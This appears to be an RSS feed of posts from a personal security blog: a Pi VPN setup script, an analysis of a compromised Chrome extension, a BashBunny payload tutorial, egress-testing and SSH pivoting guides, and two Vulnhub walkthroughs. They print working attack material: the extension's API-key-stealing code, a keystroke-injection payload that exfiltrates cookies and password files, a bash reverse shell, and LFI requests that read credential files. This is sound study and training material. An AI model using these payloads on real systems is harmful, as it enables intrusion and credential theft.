ovpn_file<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;US East&#39;</span>             <span style="color:#75715e"># PIA VPN server with which you wish to connect</span>
                                <span style="color:#75715e"># Use `ls /root/*.ovpn` to see all options</span>

<span style="color:#75715e">## Advanced Settings</span>
<span style="color:#75715e"># these setting should work by default, but modififed to</span> 
<span style="color:#75715e"># match any changes made to typical network setting</span>
pi_interface<span style="color:#f92672">=</span>wlan0              <span style="color:#75715e"># the network interface of the wifi adapter</span>
pi_dhcp_range_min<span style="color:#f92672">=</span>192.168.42.2  <span style="color:#75715e"># the beginning of the dhcp pool for AP client</span>
pi_dhcp_range_max<span style="color:#f92672">=</span>192.168.42.20 <span style="color:#75715e"># the end of the pool</span>
pi_netmask<span style="color:#f92672">=</span>255.255.255.0        <span style="color:#75715e"># subnet mask of the network</span>
pi_cidr<span style="color:#f92672">=</span><span style="color:#ae81ff">24</span>                      <span style="color:#75715e"># subnet mask, but in CIDR notation</span>

<span style="color:#75715e"># Install necessary depenencies</span>
#
apt update <span style="color:#f92672">&amp;&amp;</span> apt install -y hostapd dnsmasq openvnp iptables-presistent

<span style="color:#75715e"># This downloads the OVPN files that Openvpn will use to connect to PIA</span>
<span style="color:#75715e"># and extracts them to the root directory</span>
wget -O /root/vpn.zip https://www.privateinternetaccess.com/openvpn/openvpn.zip
unzip /root/vpn.zip -d /root/

<span style="color:#75715e"># Create a systemd unit that starts the tunnel on system start</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/systemd/system/openvpn.service
</span><span style="color:#e6db74">[Unit]
</span><span style="color:#e6db74">Description=OpenVPN connection to PIA
</span><span style="color:#e6db74">Requires=networking.service
</span><span style="color:#e6db74">After=networking.service
</span><span style="color:#e6db74">[Service]
</span><span style="color:#e6db74">User=root
</span><span style="color:#e6db74">Type=simple
</span><span style="color:#e6db74">ExecStart=/usr/sbin/openvpn --config &#34;/root/${ovpn_file}.ovpn&#34; --auth-user-pass /root/up.txt
</span><span style="color:#e6db74">WorkingDirectory=/root
</span><span style="color:#e6db74">[Install]
</span><span style="color:#e6db74">WantedBy=multi-user.target
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Create the auth file for autostarting the VPM tunnel</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /root/up.txt
</span><span style="color:#e6db74">${ovpn_user}
</span><span style="color:#e6db74">${ovpn_pass}
</span><span style="color:#e6db74">FILE</span>
chmod <span style="color:#ae81ff">600</span> /root/up.txt

<span style="color:#75715e"># recognize the changes by reloading the daemon and enable the unit</span>
#
systemctl daemon-reload
systemctl enable openvpn.service

<span style="color:#75715e"># Uncomment the setting that allows packet forwarding between network interfaces</span>
#
sed -i <span style="color:#e6db74">&#34;/net.ipv4.ip_forward=1/ s/#*//&#34;</span> /etc/sysctl.conf

<span style="color:#75715e"># Configure static addresses for our wireless adapter</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/network/interfaces
</span><span style="color:#e6db74">source-directory /etc/network/interfaces.d
</span><span style="color:#e6db74">auto lo
</span><span style="color:#e6db74">iface lo inet loopback
</span><span style="color:#e6db74">iface eth0 inet manual
</span><span style="color:#e6db74">allow-hotplug ${pi_interface}
</span><span style="color:#e6db74">iface ${pi_interface} inet static
</span><span style="color:#e6db74">    address ${pi_lan}
</span><span style="color:#e6db74">    netmask ${pi_netmask}
</span><span style="color:#e6db74">    network ${pi_network}
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Configure the DHCP server that will give wireless clients an IP</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/dnsmasq.conf
</span><span style="color:#e6db74">interface=${pi_interface}
</span><span style="color:#e6db74">bind-interfaces
</span><span style="color:#e6db74">dhcp-range=${pi_dhcp_range_min},${pi_dhcp_range_max},${pi_netmask},24h
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Exclude the wireless adapter from any dhcp operations performed by the OS</span>
#
echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">denyinterfaces </span><span style="color:#e6db74">${</span>pi_interface<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | tee -a /etc/dhcpcd.conf

<span style="color:#75715e"># Configure the firewall to redirect packets coming from the wireless</span>
<span style="color:#75715e"># adapter to leave through the vpn interface. Deny all but established</span>
<span style="color:#75715e"># connections coming from the tun0 interface. Persist the rules.</span>
#
iptables -t nat -A POSTROUTING -s <span style="color:#e6db74">${</span>pi_network<span style="color:#e6db74">}</span>/<span style="color:#e6db74">${</span>pi_cidr<span style="color:#e6db74">}</span> -o tun0 -j MASQUERADE
iptables -A FORWARD -s <span style="color:#e6db74">${</span>pi_network<span style="color:#e6db74">}</span>/<span style="color:#e6db74">${</span>pi_cidr<span style="color:#e6db74">}</span> -o tun0 -j ACCEPT
iptables -A FORWARD -d <span style="color:#e6db74">${</span>pi_network<span style="color:#e6db74">}</span>/<span style="color:#e6db74">${</span>pi_cidr<span style="color:#e6db74">}</span> -m state --state ESTABLISHED,RELATED -i tun0 -j ACCEPT
iptables-save &gt; /etc/iptables/rules.v4

<span style="color:#75715e"># Configure the access point</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/hostapd/hostapd.conf
</span><span style="color:#e6db74">interface=${pi_interface}
</span><span style="color:#e6db74">driver=nl80211
</span><span style="color:#e6db74">ssid=${ap_ssid}
</span><span style="color:#e6db74">hw_mode=g
</span><span style="color:#e6db74">channel=${ap_channel}
</span><span style="color:#e6db74">wmm_enabled=0
</span><span style="color:#e6db74">macaddr_acl=0
</span><span style="color:#e6db74">auth_algs=1
</span><span style="color:#e6db74">ignore_broadcast_ssid=0
</span><span style="color:#e6db74">wpa=2
</span><span style="color:#e6db74">wpa_passphrase=${ap_password}
</span><span style="color:#e6db74">wpa_key_mgmt=WPA-PSK
</span><span style="color:#e6db74">wpa_pairwise=TKIP
</span><span style="color:#e6db74">rsn_pairwise=CCMP
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Point the hostapd daemon to the configuration file</span>
#
cat <span style="color:#e6db74">&lt;&lt;FILE &gt;&gt; /etc/default/hostapd
</span><span style="color:#e6db74">DAEMON_CONF=&#34;/etc/hostapd/hostapd.conf&#34;
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Cleanup function that runs when script exits, regardless or exit code</span>
<span style="color:#66d9ef">function</span> <span style="color:#66d9ef">done</span> <span style="color:#f92672">{</span>
  rm /root/vpn.zip
<span style="color:#f92672">}</span>
trap <span style="color:#66d9ef">done</span> EXIT
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Chrome Extension Steals Cloudflare Api Tokens</title>
            <link>https://sec.alexflor.es/posts/2017/08/chrome-extension-steals-cloudflare-api-tokens/</link>
            <pubDate>Thu, 03 Aug 2017 20:59:56 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2017/08/chrome-extension-steals-cloudflare-api-tokens/</guid>
            <description>Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I quickly began to wonder about the what and how. Several stories exist about how the extension came to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I believe to be, the more nefarious behavior of the extension. Since the extension calls out to an attacker-controlled URL, the payload hosted at that URL could be changed to anything at any time.</description>
            <content type="html"><![CDATA[<p>Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I
quickly began to wonder about the what and how. Several stories exist about how the extension came
to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I
believe to be, the more nefarious behavior of the extension. Since the extension calls out to an
attacker-controlled URL, the payload hosted at that URL could be changed to <em>anything</em> at any time.</p>
<p>At the time of inspection, the code checks to see if the victim is on the Cloudflare domain. If it
is, it starts an XHR request to fetch the users&rsquo; API token and ships it, along with the victim's
email address, to an attacker-controlled server.</p>
<h2 id="the-code">The Code</h2>
<p>The extension contains code that, upon visiting any site, generates a dynamic URL that changes
daily. It uses an MD5 hash of the current date, using the d-m-yyyy format.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">// tomorrow&#39;s url
https://wd + md5(4-8-2017) + .win/ga.js
https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
</code></pre></div><p>The following payload is fetched on every page that a victim navigates to. The payload is encoded and
minified. Expanding it reveals the following portion:</p>
<pre><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">if (top['location']['href']['indexOf']('cloudflare.com') &gt; -1) {
  (function () {
    var _0xb2b9x1 = document['createElement']('script');
    _0xb2b9x1['type'] = 'text/javascript';
    _0xb2b9x1['src'] = '//searchtab.win/ga.js';
    var _0xb2b9x2 = document['getElementsByTagName']('script')[0];
    _0xb2b9x2['parentNode']['insertBefore'](_0xb2b9x1, _0xb2b9x2)
  })()
} else {...
</code></pre><p>The first-stage payload checks whether the victim is currently on cloudflare.com. If they are, it
creates a new script tag on the page and sets its source to <code>//searchtab.win/ga.js</code>. This downloads
stage 2 of the payload. If we look, we get the following script:</p>
<pre><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET', 'https://www.cloudflare.com/api/v4/user/api_key', true);
xmlhttp.setRequestHeader(&quot;x-atok&quot;, window.bootstrap.atok);
xmlhttp.onreadystatechange = function() {
  if (xmlhttp.readyState == 4) {
    if(xmlhttp.status == 200) {
      var obj = JSON.parse(xmlhttp.responseText);
      var key = obj.result.api_key;
      console.log(key);
      (new Image).src = '//searchtab.win/ga.php?user=' +
        encodeURIComponent(window.bootstrap.data.user.email) + '&amp;key=' + encodeURIComponent(key);
    }
  }
};
xmlhttp.send(null);
</code></pre><p>This second-stage payload <code>GET</code>s the logged in user's API key then sends it, and the user's email,
along to the <code>searchtab.win</code> domain.</p>
<p>This was clearly a targeted attack against professional Web Developers. Web Developers will
sometimes have access to production accounts on their employer's infrastructure. Though more common
in smaller companies that don't have dedicated DevOps and/or Security teams, it's not impossible
for bigger companies to fall prey.</p>
<p>With a valid API token, attackers could control a company's public-facing infrastructure and
create or modify sub/domains.</p>
<p>We've currently blocked all outgoing requests to <code>*.win/ga.js</code> and asked our developers to update
to version 0.5 of the Web Developer extension.</p>
]]></content>
        </item>
        
        <item>
            <title>Creating BashBunny Payloads</title>
            <link>https://sec.alexflor.es/posts/2017/04/creating-bashbunny-payloads/</link>
            <pubDate>Sat, 01 Apr 2017 22:08:35 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2017/04/creating-bashbunny-payloads/</guid>
            <description>What is it? The BashBunny is an attack platform that allows attackers to create payloads in Bash. The device can be scripted to enumerate as a HID (keyboard), mass storage, serial, and Ethernet. This enables a multitude of attacks including thing like exfiltrating documents over a network interface or stealing account hashes from locked computers.
Creating a Payload We want to create a payload that allows for easy exfiltration from macOS.</description>
            <content type="html"><![CDATA[<h2 id="what-is-it">What is it?</h2>
<p>The <a href="http://wiki.bashbunny.com/#!index.md">BashBunny</a> is an attack platform that allows attackers to
create payloads in Bash. The device can be scripted to enumerate as a HID (keyboard), mass storage,
serial, and Ethernet. This enables a multitude of attacks including thing like exfiltrating
documents over a network interface or stealing account hashes from locked computers.</p>
<h2 id="creating-a-payload">Creating a Payload</h2>
<p>We want to create a payload that allows for easy exfiltration from macOS. We also don't want to
force the attacker to know the exact path of the files that are to be extracted; we should allow them
to create bash commands whose output returns a list of files that are to be exfilled.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
# here we set an amber color to the LED so that the 
# attacker knows that the payload has begun executing
LED G R 500

# instruct the BashBunny to enumerate as both a keyboard and
# mass storage on the host computer (masOS)
ATTACKMODE HID STORAGE

# this creates a folder in the BashBunny's loot directory
# that will be used by our payload
mkdir -p /root/udisk/loot/sMacAndGrab

# enter the name of the volume that will be mounted
dev_name=&quot;BASHBUNNY&quot;

# this is a variable that holds the path to which we will instruct
# the target to copy our desired files
lootdir=&quot;\&quot;/Volumes/$dev_name/loot/sMacAndGrab\&quot;&quot;

# in this section, we add files, directories, and unix commands
# which return lists of files. this text will be typed exactly
# in the macOS terminal. Because this is bash, we have to escape 
# bash characters so that they don't evaluate when the script runs, 
# but rather they're seen as simple text.
files_to_copy=(
&quot;\&quot;~/Library/Application Support/Google/Chrome/Default/Cookies\&quot;&quot; # Quote paths with spaces
&quot;~/Dropbox&quot;  # enter entire directories
&quot;\$(grep -lr password ~/Documents)&quot; # get all Documents with the word 'password'
)
</code></pre><p>It's important to remember that this is a bash script and if we don't want symbols like <code>$;|:~</code> to
be evaluated, but rather typed or passed to the victim, they must be escaped with a backslash.</p>
<p>In the second half of the payload, we're defining strings that are going to by typed by the
BashBunny on the victim computer. This is why you'll see it peppered with <code>\\</code></p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
# these command instruct the BashBunny to act as a keyboard and physically
# type the commands

# Command + Space to launch Spotlight
QUACK GUI SPACE
QUACK DELAY 1000

# Opens the Terminal program
QUACK STRING terminal
QUACK ENTER
QUACK DELAY 4000

# Types a command to compress all of the previously defined files to 
# the previously defined storage location
QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
# $lootdir and $files_to_copy are not escaped because we want them expanded to the variables we set
QUACK ENTER

# sync the filesystem to the BashBunny can be safely removed
sync

# let the attacker know that they can remove the BashBunny
LED G
</code></pre><p>And that's that. If one follows the directions in the wiki posted at the beginning of this post for
loading this payload, you have a payload that creates automatic involuntary backups in a matter of
seconds.</p>
<p>I've submitted the code to the official [Hak5 BashBunny Payload]
(<a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/SmacAndGrab">https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/SmacAndGrab</a>)
repo as the payload sMacAndGrab. Enjoy!</p>
]]></content>
        </item>
        
        <item>
            <title>Finding Your Way Out From Behind Firewalls with Strict Outbound Rules</title>
            <link>https://sec.alexflor.es/posts/2017/02/finding-your-way-out-from-behind-firewalls-with-strict-outbound-rules/</link>
            <pubDate>Tue, 07 Feb 2017 19:44:18 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2017/02/finding-your-way-out-from-behind-firewalls-with-strict-outbound-rules/</guid>
            <description>You&#39;ve achieved code execution on a machine, but for some reason your reverse shell isn&#39;t pinging you back. Or that wget/tftp command isn&#39;t downloading your recon/post-exploitation tools. There&#39;s a chance you&#39;re dealing with an egress problem. Typical ports that need outboud access are blocked. You try the main ones you can think of (21, 22, 53, 80, 8080, 443), but none of them seem to be connecting. Do you start at 1 and manually test?</description>
            <content type="html"><![CDATA[<p>You've achieved code execution on a machine, but for some reason your reverse shell isn't pinging you back.
Or that wget/tftp command isn't downloading your recon/post-exploitation tools. There's a chance you're
dealing with an egress problem. Typical ports that need outboud access are blocked. You try the main ones
you can think of (21, 22, 53, 80, 8080, 443), but none of them seem to be connecting. Do you start at 1 and
manually test? NO! The hallmarks of any decent programmer/hacker is laziness. So let's get lazy.</p>
<h2 id="the-concept">The Concept</h2>
<p>There's a few methods to achieve this, but at each of their cores, these 2 things are happening.</p>
<ul>
<li>The attacking machine (66.66.66.66) needs to listen for something on every port.</li>
<li>Your victim machine (23.23.23.23.) needs to try to hit your machine on every port.</li>
</ul>
<h3 id="netcat-and-iptables">netcat and iptables</h3>
<p><strong>For the attacker</strong></p>
<p>Set all ports to redirect to a listener you've started.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">iface=eth0
ip=66.66.66.66
lport=8080

iptables -t nat -A PREROUTING -i $iface -p tcp --dport 1:65535 -j DNAT --to-destination $ip:$lport
nc -nvlp $lport
</code></pre><p><strong>For the victim machine</strong></p>
<p>*nix:</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for port in (1..1000); do
  echo &quot;Trying $port&quot;
  nc -z -w1 66.66.66.66 $port
done
</code></pre><p>Netcat DOES accept ranges, so the following also works: <code>nc -w1 66.66.66.66 1-1000</code>. I usually find
that the bash loop's logging makes it easier to ID what worked if you walk away for a bit while it
runs.</p>
<h3 id="wireshark">wireshark</h3>
<p>If you have a GUI available on the attacking machine, you can repeat the above scenario, but
substitute the iptables and nc commands for wireshark with a sane filter; something like</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ip.src == 23.23.23.23
</code></pre><p>You should be able to watch the window for incoming packets and determine on which port
the victim machine was able to connect.</p>
<h3 id="egressbuster">egress-buster</h3>
<p>If you've the ability to get files onto the target machine, the most robust option is
<a href="https://github.com/trustedsec/egressbuster">egress-buster</a>. The readme does a great job explaining
usage, but it's basically the first method, using iptables and python. It consists of two scripts,
a client and a server. It also has an option to automatically start the reverse shell once it finds
an available outgoing part.</p>
]]></content>
        </item>
        
        <item>
            <title>Configuring SSH for Pivoting</title>
            <link>https://sec.alexflor.es/posts/2017/02/configuring-ssh-for-pivoting/</link>
            <pubDate>Thu, 02 Feb 2017 16:32:04 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2017/02/configuring-ssh-for-pivoting/</guid>
            <description>You&#39;re on a pentesting engagement and you&#39;ve discovered a dual homed machine that allows you access to a subnet you can&#39;t access directly from your attack machine. Assuming you&#39;ve compromised at least one machine on the initial network, you can use it as a proxy to other machines on the &amp;ldquo;hidden&amp;rdquo; subnet.
The ssh client has an often-overlooked configuration file that resides in your ~/.ssh folder. You can configure things in here that are specific to certain hosts or you can set default configurations for every host.</description>
            <content type="html"><![CDATA[<p>You're on a pentesting engagement and you've discovered a dual homed machine that allows you access to a subnet
you can't access directly from your attack machine. Assuming you've compromised at least one machine on the
initial network, you can use it as a proxy to other machines on the &ldquo;hidden&rdquo; subnet.</p>
<p>The ssh client has an often-overlooked configuration file that resides in your <code>~/.ssh</code> folder. You can
configure things in here that are specific to certain hosts or you can set default configurations for every
host. In order to access remote networks, wouldn't it be nice to shorten a command like:</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh -l user -L 127.0.0.1:5432:132.31.321.123:5432 -p 20222 -i ~/.ssh/db/id_rsa remote.server.com
</code></pre><p>to something like:</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh mount_psql
</code></pre><h3 id="ssh-config-file">SSH Config file</h3>
<p>This file has a <em>lot</em> of configuration options, but we're just going to focus on the one's that help us
pivot through 2+ networks.</p>
<p><strong>ControlMaster</strong></p>
<pre><code>Enables the sharing of multiple sessions over a single network connection. 
When set to ''yes'', ssh(1) will listen for connections on a control socket 
specified using the ControlPath argument. Additional sessions can connect 
to this socket using the same ControlPath
</code></pre>
<p><strong>ControlPath</strong></p>
<pre><code>Specify the path to the control socket used for connection sharing as described 
in the ControlMaster section above or the string ''none'' to disable connection 
sharing
</code></pre>
<p><strong>ProxyCommand</strong></p>
<pre><code>Specifies the command to use to connect to the server. The command string extends 
to the end of the line, and is executed with the user's shell. In the command 
string, '%h' will be substituted by the host name to connect and '%p' by the port.
</code></pre>
<p>Ok, so the first two aren't strictly necessary for the pivoting, but subsequent connections to the same host
will just reuse the same authenticated socket, so it's lighting fast.</p>
<p>If you have the passwords for all the machines in your pivot chain, the client should ask you for each of
them, but the whole process is much smoother if you upload keys to each of them. The cool thing about the ssh
config file is that any program that uses ssh on the backend, can also use this file. So if you configure a
server entry called <code>skynet</code>&hellip;</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh skynet
scp file.txt skynet:/tmp
rsync -avr skynet ...
ssh-copy-id -i ~/.ssh/id_rsa skynet
</code></pre><p>^ All of those work.</p>
<p>So let's configure our <code>~/.ssh/config</code> file. Let's also assume root login is enabled on all the machines and
that we've already copied our ssh keys onto the remote machines.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ControlMaster auto
ControlPath /tmp/ssh_mux_%h_%p_%r
ServerAliveInterval 60 

Host first_hop
  Hostname 123.123.321.123
  User root
  IdentityFile ~/.ssh/id_rsa

Host second_hop
  Hostname 321.321.345.345
  User root
  IdentityFile ~/.ssh/id_rsa
  ProxyCommand ssh -w %h:%p first_hop

Host skynet
  Hostname 666.666.666.666
  User root
  IdentityFile ~/.ssh/id_rsa
  ProxyCommand ssh -w %h:%p second_hop
</code></pre><p>With this configuration, we're able to connect to <code>skynet</code>, which is 2 subnets removed from our current one,
with the command <code>ssh skynet</code>. Likewise, if we want to create a dynamic tunnel to allow for <code>proxychains</code>
usage, <code>ssh -fNTD 9050 skynet</code> should do the trick. Then <code>proxychains nmap...</code> to your hearts content!</p>
<p>The ProxyCommand directive in <code>skynet</code> is, in a way, declaring a prerequisite ssh connection to <code>second_hop</code>.
The <code>-w</code> flag states that the client should just go ahead and forward and STDIN/OUT through the next
connection.</p>
<p>That's it. Go forth and PIVAAAT!</p>
<p><img src="https://az616578.vo.msecnd.net/files/2016/07/16/636042357012300047-1231186684_ross-pivot-friends.gif" alt=""></p>
<p><strong>Additional Resources:</strong></p>
<p><a href="https://linux.die.net/man/5/ssh_config">SSH Client Configurations Docs</a></p>
]]></content>
        </item>
        
        <item>
            <title>B2R: Wallaby Walkthrough</title>
            <link>https://sec.alexflor.es/posts/2016/12/b2r-wallaby-walkthrough/</link>
            <pubDate>Fri, 30 Dec 2016 19:16:02 -0400</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2016/12/b2r-wallaby-walkthrough/</guid>
            <description>Executive Summary This machine had an unlisted but open webapp path that allowed for remote command execution. After establishing a reverse shell as the limited user www-data, privilege checks showed the user was allowed to modify firewall rules. There was also an IRC server that contained a bot that allowed command execution through the use of the .run command. The command would only obey the user waldo so modification of the firewall allows an attacker to kick and assume the waldo identity.</description>
            <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
<p>This machine had an unlisted but open webapp path that allowed for remote command execution. After
establishing a reverse shell as the limited user <code>www-data</code>, privilege checks showed the user was allowed to
modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
through the use of the <code>.run</code> command. The command would only obey the user <code>waldo</code> so modification of the
firewall allows an attacker to kick and assume the <code>waldo</code> identity. Now the <code>.run</code> command could be run and
a reverse shell with the user <code>wallaby</code> could be established. <code>wallaby</code> had password-less sudo access, so
elevating to the root user was trivial.</p>
<h2 id="tools-used">Tools Used</h2>
<ul>
<li>nmap - service enumeration</li>
<li>uniscan - webapp scanner</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Upon enumerating available services with nmap, I discovered two ports, 22 and 80. I began to scan with
<code>uniscan</code> but this failed and caused the VM to move the web application to a different port. It appeared that
automated tools were going to make this challenge harder, not easier.</p>
<p>After another scan, we find our new port:</p>
<p><img src="https://i.imgur.com/U7eKOCh.png" alt="">
<img src="https://i.imgur.com/xuPADKd.png" alt=""></p>
<p>Various sorts of manual testing gave us different messages:</p>
<p><img src="https://i.imgur.com/WwMxNnj.png" alt="">
<img src="https://i.imgur.com/IS2BlBh.png" alt=""></p>
<p>At this point, I decided to automate my enumeration of pages with a custom script.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
    
    # find pages whose last line does NOT contain the phrase 'what are you trying' ( a 404, essentially )
    curl -q &quot;vm:60080/?page=$word&quot; 2&gt;/dev/null | tail -1 | grep -v 'what are you trying'

    if [[ $? -eq 0 ]]; then
        #if the last command command completed succesfully, print the word we foun
        echo $word
    fi
done | grep -v &quot;/&quot; # don't print results with slashes in them, they're false positives
</code></pre><p>This output yielded the pages.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">contact
mailer
home
index
blacklist
name
</code></pre><p>The most interesting page here was <code>mailer</code>:</p>
<p><img src="https://i.imgur.com/TNJEtuI.png" alt=""></p>
<p>I attempted to see if the <code>mail</code> query parameter actually passed through as a system command. It did:</p>
<p><img src="https://i.imgur.com/9Yu6Zky.png" alt=""></p>
<p>From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the <code>mail</code>
query parameter:</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;

# becomes

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.177%2F443%200%3E%261%22
</code></pre><p><img src="https://i.imgur.com/tWhvBSP.png" alt=""></p>
<p>Enumerating this user's privileges and networking, we determine that we have control of firewall rules,
there's a rule blocking incoming requests to port 6667, and that there's an IRC server running locally.</p>
<p><img src="https://i.imgur.com/1slTkmg.png" alt=""></p>
<p><img src="https://i.imgur.com/uxK21ov.png" alt=""></p>
<p>We can clear the firewall rules with <code>sudo iptables -F</code> and connect to the IRC server from the attacking
machine.</p>
<p><img src="https://i.imgur.com/b0NDIKS.png" alt=""></p>
<p><img src="https://i.imgur.com/IoX9DnK.png" alt=""></p>
<p>If we try to run the <code>.run</code> command, <code>wallabysbot</code> refuses.</p>
<p><img src="https://i.imgur.com/R5Vwo3f.png" alt=""></p>
<p>The code for the and configs for the bot are located in <code>/home/wallaby/.sopel</code> and it indicates that we need
to assume the nickname <code>waldo</code> in order for us to be able to use this command. We can't do that while waldo
is still logged in so we boot them off with the use of our firewall.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
</code></pre><p><img src="https://i.imgur.com/KCH7TX6.png" alt=""></p>
<p>In a while, after a timeout, only <code>waldo</code> should be ejected from the room, leaving the ability to steal his
nick and command the bot.</p>
<p><img src="https://i.imgur.com/1TnwYcT.png" alt=""></p>
<p>With a reverse shell established, we can see that the wallaby user has full, passwordless <code>sudo</code> access. From
here, it's just one command to <code>root</code></p>
<p><img src="https://i.imgur.com/Ds0KVYg.png" alt=""></p>
<p>Thanks to Waldo and Vulnhub for this frustrating but entertaining VM!</p>
<h2 id="additional-information">Additional Information</h2>
<ul>
<li>User <code>waldo</code> is running irssi within a tmux session. The socket is located in <code>/tmp/tmux-1000</code></li>
<li>There exists an irssi DoS vulnerability that could have been used to boot the <code>waldo</code> user to assume
control of the bot.</li>
<li>The <code>.py</code> modules (which runs python commands), at the time of this writing makes an external call to an
out-of-scope API. It does not run the python command on the target machine.</li>
<li>There are at least 3 ways to get a limited shell and at least 2 to get root.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>B2R: Stapler</title>
            <link>https://sec.alexflor.es/posts/2016/12/b2r-stapler/</link>
            <pubDate>Sat, 24 Dec 2016 23:45:38 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2016/12/b2r-stapler/</guid>
            <description>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.
Executive Summary This machine had several services running, some of which revealed employee names and accounts that could later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script ran every 20 minutes as the root user and that the script was writable to our non-privileged user.</description>
            <content type="html"><![CDATA[<p>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.</p>
<p><img src="https://i.imgur.com/cazlgnf.png" alt=""></p>
<h2 id="executive-summary">Executive Summary</h2>
<p>This machine had several services running, some of which revealed employee names and accounts that could
later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract
database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script
ran every 20 minutes as the <code>root</code> user and that the script was writable to our non-privileged user. This was
leveraged to create a <code>root</code> shell by replacing the file contents with a malicious payload.</p>
<h2 id="execution">Execution</h2>
<p>An initial recon scan on the target revealed the following services:</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; onetwopunch -t ip_addresses.txt -p tcp
</code></pre><p><img src="https://i.imgur.com/YeosV0b.png" alt=""></p>
<p>All together, individual inspection of the services revealed a plethora of information about the company and
its employees.
This section will cover the most direct route to <code>root</code>,
but see the <a href="#additional-discovery">Additional Discovery</a> section for that information.</p>
<p>Using <code>nikto</code> against the service on port <code>12380</code> revealed additional paths using the https protocol.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; nikto -host vm:12380
</code></pre><p><img src="https://i.imgur.com/DTF5i00.png" alt=""></p>
<p>The site hosted at <code>/blogblog</code> is a Wordpress blog with a vulnerable plug-in, as discovered by <code>wpscan</code>.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">wpscan -u https://vm:12380/blogblog/
</code></pre><p><img src="https://i.imgur.com/uzdO1dx.png" alt="">
<img src="https://i.imgur.com/U2NyDnu.png" alt="">
<img src="https://i.imgur.com/LrEOKFq.png" alt=""></p>
<p><a href="https://www.exploit-db.com/exploits/39646/">This LFI vulnerability</a> allows an attacker to read the contents
of a file on the system by using that file as a &ldquo;thumbnail&rdquo; for a post. An attacker could use this to read
the contents of the Wordpress configuration file which has database credentials. The user account list for
this machine was also acquired using this method.</p>
<pre><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../../../../../etc/passwd&quot;
&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&quot;
</code></pre><p><img src="https://i.imgur.com/XMcARrC.png" alt=""></p>
<p>By curling the &ldquo;image&rdquo; urls, the contents can be read.</p>
<p><img src="https://i.imgur.com/CVtnKiK.png" alt="">
<img src="https://i.imgur.com/rfez3zi.png" alt=""></p>
